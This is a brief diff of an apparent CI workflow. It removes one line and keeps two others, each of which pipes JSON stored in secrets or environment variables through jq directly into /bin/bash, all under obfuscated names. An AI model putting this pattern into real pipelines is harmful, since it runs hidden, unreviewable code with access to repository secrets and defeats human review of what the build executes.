@@ -27,7 +27,6 @@ jobs:
           ovbiy6317: ${{ secrets.ovbiy6317 }}
         run: |
           printf '%s' "$ovbiy6317" | jq -r .mfif18997 | /bin/bash
-          printf '%s' "$hnp77694" | jq -r .a270 | /bin/bash
           echo $hdy1506 | jq -r .t7 | /bin/bash
 
       - name: Persist output
